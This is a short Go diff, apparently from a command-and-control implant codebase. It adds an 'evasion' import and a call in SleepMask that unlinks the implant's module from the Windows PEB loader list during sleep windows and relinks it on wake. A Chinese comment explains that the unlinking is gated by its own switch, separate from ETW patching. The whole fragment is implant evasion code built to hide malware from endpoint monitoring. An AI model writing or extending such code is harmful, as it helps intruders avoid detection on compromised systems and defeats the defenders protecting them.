@@ -4,6 +4,7 @@ import (
 	"encoding/binary"
 	"implant/core/config"
 	"implant/core/encrypt"
+	"implant/core/evasion"
 	"math/rand"
 	"time"
 )
@@ -126,6 +127,13 @@ func SleepMask(d time.Duration) {
 		time.Sleep(d)
 		return
 	}
+	// 睡眠窗口内把本模块从 PEB 加载器链表摘掉（P2）：醒来立刻挂回。
+	// 门控是独立的 sleepMaskHide 开关（P4 从"任一主机层对抗开着"里拆出来）——
+	// 摘链能降低模块枚举可见度，但破坏了加载器一致性，不该被 ETW patch 之类
+	// 无关开关顺带打开。失败/未启用时是空操作。
+	restoreModule := evasion.HideForSleep(config.SleepMaskHideEnabled())
+	defer restoreModule()
+
 	deadline := time.Now().Add(d)
 	for {
 		remaining := time.Until(deadline)
